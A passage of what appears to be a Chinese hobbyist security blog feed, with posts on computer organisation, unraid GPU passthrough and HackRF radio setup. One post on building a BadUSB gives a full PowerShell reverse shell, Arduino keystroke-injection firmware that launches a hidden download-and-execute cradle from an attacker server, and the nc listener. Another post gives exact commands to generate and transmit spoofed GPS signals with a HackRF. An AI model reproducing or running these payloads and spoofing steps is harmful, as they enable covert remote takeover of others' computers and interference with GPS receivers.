title="基本特征"></a>基本特征</h3><blockquote><p>组成</p></blockquote><p>计算机由运算器、存储器、输入/输出单元和控制器组成，以运算器为中心连接在一起</p><blockquote><p>存储器</p></blockquote><p>存储器由一组一维排列、线性编址的存储单元组成，每个存储单元的位数是相等且固定的，存储单元按地址访问</p><blockquote><p>程序</p></blockquote><p>程序是由一条条指令有序排列而成。而指令由操作码和地址码两部分组成</p><blockquote><p>二进制</p></blockquote><p>指令和数据均采用二进制数表示及运算</p><blockquote><p>相同</p></blockquote><p>程序(指令)与数据是同等的不加区分的存储在同一个存储器中</p><blockquote><p>PC</p></blockquote><p>设置程序计数器PC来指示下一条将要执行的指令的地址。每执行完一条指令，程序计数器自动加1，指向下一条指令的存储单元</p><h2 id="计算机硬件框图"><a href="#计算机硬件框图" class="headerlink" title="计算机硬件框图"></a>计算机硬件框图</h2><h3 id="以存储为中心的计算机"><a href="#以存储为中心的计算机" class="headerlink" title="以存储为中心的计算机"></a>以存储为中心的计算机</h3><p><img src="/2024/03/12/存储框图.png" alt="存储框图"></p><h3 id="现代计算机硬件框图"><a href="#现代计算机硬件框图" class="headerlink" title="现代计算机硬件框图"></a>现代计算机硬件框图</h3><script type="math/tex; mode=display">硬件\begin{cases}主机\begin{cases}CPU\\主存\end{cases}\\辅存\\I/O设备\begin{cases}输入设备\\输出设备\\\end{cases}\\\end{cases}</script><p><img src="/2024/03/12/现代框图.png" alt="现代框图"></p><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>冯·诺伊曼计算机是以一个部件为中心，五个部件互联的星型结构</p><p>这样是最简单的、连接链路最少的</p><p>由于外围四个部件只能与中心部件进行数据通信，且有的数据通路还是单向</p><p>故冯·诺伊曼计算机所需要的<strong>数据传送功能也最少、最简单</strong></p><p>冯·诺伊曼计算机：用最简单、最易于实现的思想来表示数据并实现运算，用最简单的互联结构来组成一台计算机</p><h2 id="计算机的工作步骤"><a href="#计算机的工作步骤" class="headerlink" title="计算机的工作步骤"></a>计算机的工作步骤</h2><h3 id="上机前准备"><a href="#上机前准备" class="headerlink" title="上机前准备"></a>上机前准备</h3><p>建立数学模型</p><p>确定计算方法</p><p>编制解题程序</p><h3 id="计算机的解题过程-1"><a href="#计算机的解题过程-1" class="headerlink" title="计算机的解题过程"></a>计算机的解题过程</h3><h4 id="存储器的基本组成"><a href="#存储器的基本组成" class="headerlink" title="存储器的基本组成"></a>存储器的基本组成</h4><p>存储单元：存放一串二进制代码</p><p>存储字：存储单元中二进制代码的组合</p><p>存储字长：存储单元二进制代码的位数；每个单元赋予一个地址号</p><p>按地址寻访</p><p><img src="/2024/03/12/存储器.png" alt="存储器" style="zoom:50%;"></p><p>MAR 存储器地址寄存器 反映存储单元个数 MAR n位 则存储单元个数为$2^n$个</p><p>MDR 存储器数据寄存器 反映存储字长 MDR n位 则存储字长为n</p><h4 id="运算器的基本组成"><a href="#运算器的基本组成" class="headerlink" title="运算器的基本组成"></a>运算器的基本组成</h4><p><img src="/2024/03/12/运算器的基本组成.png" alt="运算器的基本组成"></p><h4 id="控制器的基本组成"><a href="#控制器的基本组成" class="headerlink" title="控制器的基本组成"></a>控制器的基本组成</h4><p><img src="/2024/03/12/控制器的基本组成.png" alt="控制器的基本组成"></p><h4 id="主机完成一条指令的过程"><a href="#主机完成一条指令的过程" class="headerlink" title="主机完成一条指令的过程"></a>主机完成一条指令的过程</h4><h5 id="取数指令"><a href="#取数指令" class="headerlink" title="取数指令"></a>取数指令</h5><p><img src="/2024/03/12/取数指令.png" alt="取数指令"></p><h5 id="存数指令"><a href="#存数指令" class="headerlink" title="存数指令"></a>存数指令</h5><p><img src="/2024/03/12/存数指令.png" alt="存数指令"></p><h1 id="计算机硬件的主要技术指标"><a href="#计算机硬件的主要技术指标" class="headerlink" title="计算机硬件的主要技术指标"></a>计算机硬件的主要技术指标</h1><h2 id="机器字长"><a href="#机器字长" class="headerlink" title="机器字长"></a>机器字长</h2><blockquote><p>CPU一次能处理数据的位数，与CPU中寄存器的位数有关</p></blockquote><h2 id="运算速度"><a href="#运算速度" class="headerlink" title="运算速度"></a>运算速度</h2><p>主频</p><p>吉普森法 $T_M=\sum^n_{i=1}f_it_i$</p><p>MIPS 每秒执行百万条指令</p><p>CPI 执行一条指令所需的时钟周期数</p><p>FLOPS 每秒浮点运算次数</p><h2 id="存储容量"><a href="#存储容量" class="headerlink" title="存储容量"></a>存储容量</h2><blockquote><p>存放二进制信息的总位数</p><p>存储单元个数 × 存储字长</p></blockquote><p>几个单位</p><script type="math/tex; mode=display">\begin{flalign}&1K=2^{10}\\&1M=2^{20}\\&1G=2^{30}\\&1B=2^3b\\&下例：\\&2^{13}=1KB\\&2^{31}=256MB\\\end{flalign}</script><h2 id="主频"><a href="#主频" class="headerlink" title="主频"></a>主频</h2><p>主频的倒数叫时钟周期</p><p>执行一个程序的所需的处理器时间可用 <strong>该程序指令条数×CPI×时钟周期</strong>来估算</p><h2 id="存储器的存取周期"><a href="#存储器的存取周期" class="headerlink" title="存储器的存取周期"></a>存储器的存取周期</h2><p>即对存储器进行一次完整的读/写操作所需的全部时间，也是连续对存储器进行存/取的最小时间间隔，称为存储器的存取周期。</p><p>半导体存储器的存取周期在几十到上百纳秒$10^{-9}s,ns$之间</p><p>磁盘存取周期在10毫秒$10^{-3},ms$以上</p><h2 id="功耗"><a href="#功耗" class="headerlink" title="功耗"></a>功耗</h2><p>功耗随主频和片内晶体管数量的提高而提高。现代处理器功耗峰值超过100w</p><blockquote><p>移动计算领域功耗是压倒一切的性能指标</p></blockquote><h2 id="软件兼容性"><a href="#软件兼容性" class="headerlink" title="软件兼容性"></a>软件兼容性</h2><p>软件兼容可分为向上(下)兼容和向前(后)兼容</p><p>“向上（下）兼容”是指为某档机器编制的软件，不加修改就可以正确运行在比它更高（低）档的机器上；“向前（后）兼容”是指为某个时期投入市场的某种型号机器编制的软件，不加修改就可以正确运行在比它早（晚）投入市场的相同型号机器上。</p><p><strong>系列机之间必须能够做到“向后兼容” ，力争做到“向上兼容”，对于“向下兼容”或“向前兼容”不做要求**</strong>。**</p><h2 id="系统软件配置"><a href="#系统软件配置" class="headerlink" title="系统软件配置"></a>系统软件配置</h2><p>常见的系统软件有：操作系统、数据库系统、文本编辑器、高级语言程序开发环境、互联网浏览器</p><h2 id="吞吐率和响应时间"><a href="#吞吐率和响应时间" class="headerlink" title="吞吐率和响应时间"></a>吞吐率和响应时间</h2><p>吞吐率是指计算机系统在单位时间内完成的任务数</p><p>响应时间是指用户在输入命令或数据后得到第一个结果的时间间隔</p><h2 id="辅助存储器容量"><a href="#辅助存储器容量" class="headerlink" title="辅助存储器容量"></a>辅助存储器容量</h2><blockquote><p>决定了计算机系统能存储的信息总量</p></blockquote><h2 id="可拓缩性"><a href="#可拓缩性" class="headerlink" title="可拓缩性"></a>可拓缩性</h2><p>一个计算机可以在保持软件兼容性的同时，可向上拓展获得更高性能，也可以向下收缩来降低价格</p><h2 id="RASIS特性"><a href="#RASIS特性" class="headerlink" title="RASIS特性"></a>RASIS特性</h2><p>可靠性（reliability）</p><p>可用性（availability）</p><p>可服务性/可维护性（serviceability）</p><p>完整性（integrality）</p><p>安全性（security）</p><blockquote><p> 可靠性用“平均无故障时间(Mean Time To Failure，MTTF)”或“平均故障间隔时间(Mean Time Between Failure，MTBF)”来衡量，可服务性/可维护性用“平均修复时间(Mean Time To Repair，MTTR)”来衡量。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unraid直通显卡</title>
      <link href="/2024/03/06/"/>
      <url>/2024/03/06/</url>
      
        <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>从本文开始此博客更新于作者的unraid服务器！</p><p>本文提供unraid系统下将独立显卡直通给windows10 虚拟机的教程。国内教程少，且不具体，作者参考了部分帖子和油管视频写这篇文章，希望能给玩虚拟机直通的人有帮助。</p><p>本文环境为</p><p>unraid 6.12.8系统</p><p>虚拟机环境为windows 10 后文会贴出详细配置</p><p>显卡为Nvidia Zotac GTX 1070 Ti（这张显卡似乎有点毛病，一个风扇不转了）</p><h1 id="VMS-Manager-设置"><a href="#VMS-Manager-设置" class="headerlink" title="VMS Manager 设置"></a>VMS Manager 设置</h1><p>打开unraid WebUI</p><p>打开<strong>设置</strong> — <strong>虚拟机管理器</strong> 并打开高级视图</p><p>主要设置的就是<strong>PCIe ACS覆盖</strong> 基本设置为两者（both）或者多功能（multi- function）</p><p>VFIO允许不安全的中断可以选择<strong>是</strong></p><p>设置如下图：</p><p><img src="/2024/03/06/1.png" alt="1"></p><p>PCIe ACS覆盖的选择可以多尝试，成功的办法看后一节</p><h1 id="隔离显卡"><a href="#隔离显卡" class="headerlink" title="隔离显卡"></a>隔离显卡</h1><p>打开<strong>工具</strong> — <strong>系统设备</strong> 等待加载一会儿</p><p>可以看到加载出来的<strong>IOMMU group</strong></p><p>从这些组中找到N卡相关的组如图：</p><p>[<img src="/2024/03/06/2.png" alt="2"></p><p>只要能都打上勾，选择绑定，就成功隔离了显卡，这一步成功就代表上面PCIe ACS设置是正确的</p><p>此外，这一步会提示需要重启，重启成功后进行下一步操作。</p><p>重启完以后，unraid仪表盘如果下载有GPU statistics，就已经检测不到显卡了</p><h1 id="设置windows虚拟机"><a href="#设置windows虚拟机" class="headerlink" title="设置windows虚拟机"></a>设置windows虚拟机</h1><p>这一步要安装windows</p><p>无需多言，上配置图：</p><p>首先选择合适的CPU和内存，机器我这边选择i440fx ，Q35兼容性会好点</p><p>BIOS选择SeaBIOS兼容性好</p><p>Hyper-V就是是否虚拟化，选是就行</p><p>usb控制器，打上3.0就行</p><p>然后选择我们的win10镜像，这个镜像直接用ssh工具连上服务器以后传到isos里就可以被识别了</p><p>这个光盘总线都用sata，实测用其他的检测不到，需要加载驱动</p><p>VirtIO驱动很关键，只有它才能给你虚拟机上网，去前文VM Manager设置里下载最新的就行，然后这里能选它</p><p><img src="/2024/03/06/3.png" alt="3"></p><p>接下来是磁盘设置</p><p>我设置了多个盘，一开始测试直接自动就行，总线记得选sata一样的道理，其他的不用改</p><p><img src="/2024/03/06/4.png" alt="4"></p><p>显卡部分，我设置了两个输出</p><p>一个是VNC连接，避免显卡可能输出视频有问题的情况出现，可以先给显卡打上驱动（虽然貌似不会有显卡输出不了的问题，要是有，可以试试插拔一下DP/HDMI接口线）</p><p>第二个就是N卡，Rom BIOS不用填 声卡也选上</p><p>网络资源默认就行，USB设备选择你要连接的外设就行，一般键盘鼠标</p><p><img src="/2024/03/06/5.png" alt="5"></p><h1 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h1><p>安装系统不赘述</p><h2 id="网卡驱动"><a href="#网卡驱动" class="headerlink" title="网卡驱动"></a>网卡驱动</h2><p>安装完，会发现没网络。原因就是网卡驱动没有</p><p>解决办法：加载VirtIO驱动</p><p>打开文件管理器，会发现有个多出的盘，就是VirtIO驱动位置。</p><p>打开设备管理器，选择那个打⚠️的以太网接口，更新驱动，从本地那个VirtIO盘加载就行</p><p>这样就连上网了</p><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><p>简单，上Nvidia官网安装对应驱动就行</p><p>安装完，设备管理器应该能识别到对应的显卡名字了</p>]]></content>
      
      
      <categories>
          
          <category> 硬件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unraid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BadUSB制作尝试</title>
      <link href="/2024/01/13/"/>
      <url>/2024/01/13/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章是作者想要尝试一下近源渗透，于是购买了一个badusb进行制作。网上有不少教程，可惜有的不适配我的硬件，有的程序也过旧了，没有维护。于是自己总结了各路经验写下这个文章，希望感兴趣的可以制作一个自己的BadUsb。</p><h2 id="基本构思"><a href="#基本构思" class="headerlink" title="基本构思"></a>基本构思</h2><p>1.通过烧录指定的程序进入badusb</p><p>2.攻击机开启nc监听服务</p><p>3.目标机插入badusb后，会自动打开终端，并主动连接攻击机，弹出shell，从而攻击机获得控制权</p><h2 id="硬件选择"><a href="#硬件选择" class="headerlink" title="硬件选择"></a>硬件选择</h2><p>查看了各方资料，发现Rubber Ducky和hak5之类的usb确实效果很牛，并且已经集成了功能。但很贵，同时我意在自己制作一个。最后决定购买Arduino Leonardo这款badusb ，我在某鱼上购买，质量还不错。</p><p>badusb的本质是一个单片机，可模拟键盘操作。实际上是一种HID（Human interface device），即人体学接口设备。</p><p>很多类似产品都可以实现该项目。</p><h2 id="环境要求及搭建"><a href="#环境要求及搭建" class="headerlink" title="环境要求及搭建"></a>环境要求及搭建</h2><p>电脑：Windows11+Kali Linux</p><p>云服务器：Debian 1台（局域网内测试可省略）</p><p>攻击机linux需要搭建简单的web下载服务，在此不赘述。</p><p>安装nginx服务后配置nginx.conf即可</p><p>这里作者用kali安装了Arduino用于单片机编程及烧录，事实上什么机子都行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install Arduino</span><br></pre></td></tr></table></figure><p>如果启动失败，大概率需要更新java</p><p>在监听机下安装netcat：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install netcat</span><br></pre></td></tr></table></figure><h2 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h2><h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><p>我的主要目标是连接到攻击机的监听端口上去。下面这段程序中,表示创建了一个socket连接到指定的server_ip的server_port端口。同时反向shell连接了攻击机。把这段代码贴到powershell里应该可以直接连上攻击机。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&#x27;server_ip&#x27;</span>,server_port);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>可以把这段代码放到一个ps1文件里，我命名为crack.ps1。</p><h3 id="Keyboard模拟"><a href="#Keyboard模拟" class="headerlink" title="Keyboard模拟"></a>Keyboard模拟</h3><p>代码作用：</p><p>模拟键盘通讯，按下win+r键，并开启大写锁定以屏蔽输入法。输入指令弹出powershell并最小化，执行服务器上下载的ps1脚本</p><p>这一段话的大小写是相反的，因为实操中发现事实上打出的字大小写会互换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POWERSHELL -wINDOWsTYLE hIDDEN -cOMMAND &amp; &#123; iNVOKE-eXPRESSION ((nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING(&#x27;HTTP://your_server_ip/CRACK.PS1&#x27;)) &#125;</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;POWERSHELL -wINDOWsTYLE hIDDEN -cOMMAND &amp; &#123; iNVOKE-eXPRESSION ((nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING(&#x27;HTTP://your_server_ip/DOWNLOADS/RS/CRACK.PS1&#x27;)) &#125;&quot;</span>);  </span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">200</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">releaseAll</span>();</span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="如何烧录"><a href="#如何烧录" class="headerlink" title="如何烧录"></a>如何烧录</h3><p><strong>先将代码里的your_server_ip换成自己的ip</strong>，注意自己配置的下载路径</p><p>将该代码用arduino烧录，注意烧录是选择board为Arduino Leonardo ，Port自查</p><p>点菜单栏里的右箭头即可烧录</p><p><img src="/2024/01/13/arduino.png" alt="arduino"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="攻击机准备监听"><a href="#攻击机准备监听" class="headerlink" title="攻击机准备监听"></a>攻击机准备监听</h3><p>我的攻击机为kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 10080 -k</span><br></pre></td></tr></table></figure><p>该代码的作用是：在10080端口开启一个nc监听，保持连接</p><p>提示，你可能需要开启防火墙</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw allow 端口号/tcp</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">ufw status</span><br></pre></td></tr></table></figure><p><img src="/2024/01/13/nclisten.png" alt="nclisten"></p><h3 id="目标主机插入BadUsb"><a href="#目标主机插入BadUsb" class="headerlink" title="目标主机插入BadUsb"></a>目标主机插入BadUsb</h3><p>目标主机没有安装杀毒软件，但开启windows defender</p><p>现象：延迟5s后打开运行对话框，自动输入指定指令，按下回车后自动执行ps1脚本，同时会把powershell窗口最小化。</p><h3 id="攻击机现象"><a href="#攻击机现象" class="headerlink" title="攻击机现象"></a>攻击机现象</h3><p>usb插入不久后，攻击机上显示已连接上某ip主机，此时按回车会进入powershell，拿下目标主机控制权。</p><p><img src="/2024/01/13/ncconnect.png" alt="ncconnect"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>这次尝试是特殊的，因为其实我之前做的反弹shell并不多，同时这个例子也有一定实际意义。我对于硬件编程有了一定理解，在我将该项目转移使用公网服务器的过程中也遇到了不少挑战。相信以后还可以开发出更好玩的BadUsb。</p><h3 id="亟待解决"><a href="#亟待解决" class="headerlink" title="亟待解决"></a>亟待解决</h3><p>BadUsb肯定是不局限于远程上线的，有更狠的活暂时不会，也有点不敢做，自己以后慢慢研究了。</p><p>BadUsb也可以用来植入木马了，通过powershell 利用certutil可以下载木马等（需要免杀）</p><p>还未测试各类杀毒软件是否会报毒badusb</p>]]></content>
      
      
      <categories>
          
          <category> badusb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One伪造GPS信号</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hackrf是可以发送无线电的，加上了时钟模块的板子可以模拟出GPS定位。</p><p>可怜的作者手头没有可用的安卓机子，因此只能发不能测试，只好根据网上的教程来实验一波</p><p>本实验环境基于虚拟机 Kali Linux 2022.2 ARM，hackrf板子需要安装时钟信号模块和发送天线</p><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><h3 id="GPS-SDR-SIM安装"><a href="#GPS-SDR-SIM安装" class="headerlink" title="GPS-SDR-SIM安装"></a>GPS-SDR-SIM安装</h3><p>在合适的地方创建一个目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> GPS_CHEAT</span><br></pre></td></tr></table></figure><p>下载gps-sdr-sim源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/osqzss/gps-sdr-sim.git</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gps-sdr-sim </span><br><span class="line">sudo gcc gpssim.c lm )3 -o gps-sdr-sim -DUSER_MOTION_SIZE=4000</span><br><span class="line"><span class="built_in">chmod</span> -R 777 gps-sdr-sim</span><br></pre></td></tr></table></figure><h3 id="定位GPS卫星"><a href="#定位GPS卫星" class="headerlink" title="定位GPS卫星"></a>定位GPS卫星</h3><p>前往这个网址</p><p><a href="http://www.igs.gnsswhu.cn/index.php/home/data_product/igs.html">http://www.igs.gnsswhu.cn/index.php/home/data_product/igs.html</a></p><p>下载广播星历</p><p>下载得到类似<code>brdc0050.24n</code>这种文件</p><p>放入之前的文件夹中</p><h3 id="查询经纬度信息"><a href="#查询经纬度信息" class="headerlink" title="查询经纬度信息"></a>查询经纬度信息</h3><p>上各种网站查</p><p>我这边得到一组坐标</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">122.1469258210449,37.44940186081953</span><br></pre></td></tr></table></figure><h3 id="生成欺骗文件"><a href="#生成欺骗文件" class="headerlink" title="生成欺骗文件"></a>生成欺骗文件</h3><p>产生一个gpssim.bin二进制文件</p><p>这个文件里存储的就是我输入的坐标信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc0050.24n -l 122.1469258210449,37.44940186081953 -b 8 -o gpssim.bin</span><br></pre></td></tr></table></figure><p><img src="/2024/01/06/gpssimbin.png" alt="gpssimbin"></p><h2 id="发送信息"><a href="#发送信息" class="headerlink" title="发送信息"></a>发送信息</h2><p>准备了那么久终于可以发信号了</p><p>用hackrf_tansfer工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R</span><br></pre></td></tr></table></figure><p>-t 文件名bin文件</p><p>-f 为发送频率 (不修改)</p><p>-s 采样速率 （不修改）</p><p>-a 放大器使能 1/0</p><p>-x 增益分贝 0-47分贝，1dB步长</p><p>-R 重复发送</p><p><img src="/2024/01/06/gpssend.png" alt="gpssend"></p><p>成功发送了，应该是可以被手机接收到的，不过需要断网操作，目前的手机联网后可以自动获取定位信息。</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One 收听FM电台</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<p>刚安装完hackrf环境，可以用这个小实验测试一波硬件是否正常工作。</p><p>这个实验用安装的gqrx操作</p><p>进入gqrx</p><p>第一步</p><p>调节Receiver Options里的选项</p><p>将Mode 调节为WFM mono</p><p>然后调节(向上)Squelch，直到右下角的视图里有波形，此时如果适当调节Gain值，则可以听到滋滋电流声</p><p><img src="/2024/01/06/gqrx_receiver.png" alt="gqrx_receiver"></p><p>第二步</p><p>调频到你所在地区的一个FM频段</p><p>此时调节BB的值，你应该已经可以清楚的听到人声了</p><p>适当调节BF和IF的值，可以使得声音更清晰</p><p>Gain值可以增大声音，但过大会有强烈电流音</p><p><img src="/2024/01/06/hackrf_input.png" alt="hackrf_input"></p><p>没有什么问题的话，这块板子的接收功能还是不错的，在我所在的地区，广播电台的声音相当清楚。</p>]]></content>
      
      
      <categories>
          
          <category> HACKRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HackRF One 环境安装指南</title>
      <link href="/2024/01/06/"/>
      <url>/2024/01/06/</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>作者在放假前突发奇想想玩软件无线电，于是乎在某鱼花了点钱购入了一块hackrf板子。算是卖家里面最便宜的一档了，时钟信号模块一并组装好了。</p><h2 id="硬件部分"><a href="#硬件部分" class="headerlink" title="硬件部分"></a>硬件部分</h2><p>这块板子买来，卖家也不知道是什么年产的了，不过外观状况良好。</p><p>以下是各个部件：</p><p>hackrf主体部分带时钟模块</p><p>接收天线</p><p>时钟信号天线</p><p>usb数据线</p><p>注意到hackrf板子是micro-usb连接的，既是供电口，又是数据连接口。</p><p>无需赘述，不懂硬件</p><h2 id="安装软件环境"><a href="#安装软件环境" class="headerlink" title="安装软件环境"></a>安装软件环境</h2><p>作者本来想在ubuntu里安装这些环境，没想到有一点意外无法解决。</p><p>后来还是回到了我熟悉的环境虚拟机Kali Linux 2022.2 ARM中</p><p>kali安装环境很无脑，适合我这样的新手hhh。</p><h3 id="hackrf工具下载"><a href="#hackrf工具下载" class="headerlink" title="hackrf工具下载"></a>hackrf工具下载</h3><p>由于linux自带了hackrf驱动，因此不必下载驱动，直接安装工具即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install hackrf</span><br></pre></td></tr></table></figure><p>安装完成后测试一下虚拟机是否能够正常连接hackrf固件吧</p><p>1.将hackrf板子连接至电脑，指定连接到虚拟机</p><p>2.终端中输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hackrf_info</span><br></pre></td></tr></table></figure><p>若出现如下则安装成功，你的板子可以成功连接到电脑了</p><p>插一嘴这个板子是2017年的，6年的板子了，难怪便宜hhh，不过还是好用的（）</p><p><img src="/2024/01/06/hackrf_info.png" alt="hackrf_info"></p><h3 id="gqrx下载"><a href="#gqrx下载" class="headerlink" title="gqrx下载"></a>gqrx下载</h3><p>apt-get方便快捷</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gqrx-sdr</span><br></pre></td></tr></table></figure><p>在我的机器上，这个软件从终端打开，会提示Connection refused</p><p>直接从开始菜单栏找到gqrx的应用打开即可</p><p>第一次打开，在第一个设备栏里选中hackrf one即可</p><h3 id="GNUradio下载"><a href="#GNUradio下载" class="headerlink" title="GNUradio下载"></a>GNUradio下载</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gnuradio</span><br></pre></td></tr></table></figure><p>用以下命令运行gnuradio</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p>若无法打开，检查命令行报错，一般是报一堆java的错</p><p>检查java版本，更新</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install 